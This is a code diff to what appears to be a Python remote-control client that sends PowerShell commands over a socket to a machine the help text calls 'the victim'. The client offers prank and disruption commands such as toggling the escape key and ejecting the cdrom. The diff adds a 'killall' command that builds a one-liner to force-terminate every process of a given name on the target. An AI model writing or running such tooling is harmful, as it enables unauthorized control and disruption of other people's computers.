@@ -135,6 +135,7 @@ while not stop:
             print("ducky/escape         N/A          Prank the victim with a toggling escape key")
             print("ducky/cdrom          N/A          Eject the cdrom drive")
             print("ducky/iter           \"#\" {\"code\"} Run the powershell code a specified # of times")
+            print("ducky/killall        \"process\"    Kill all processes with this name")
             stdin = ""
         elif ducky_command[:4] == "quit":
             options = [x for x in ducky_command.split(" ")[1:] if x]
@@ -248,10 +249,14 @@ while not stop:
             else:
                 commands.append("1.." + options[0] + " | % " + powershell_code)
             stdin = "; ".join(commands)
+        elif ducky_command[:7] == "killall":
+            options = [x for x in ducky_command.split(" ")[1:] if x]
+            commands = []
+            commands.append("tasklist | findstr /i " + options[0] + " | findstr /v $pid | foreach-object{taskkill /f /pid $_.split(\" \")[16]}")
+            stdin = "; ".join(commands)
         else:
             print("Ducky command not recognized: \"" + ducky_command + "\"")
             stdin = ""
     last = stdin
-    print("STDIN: " + stdin)
     conn.send((stdin + "\n").encode())
 s.close()
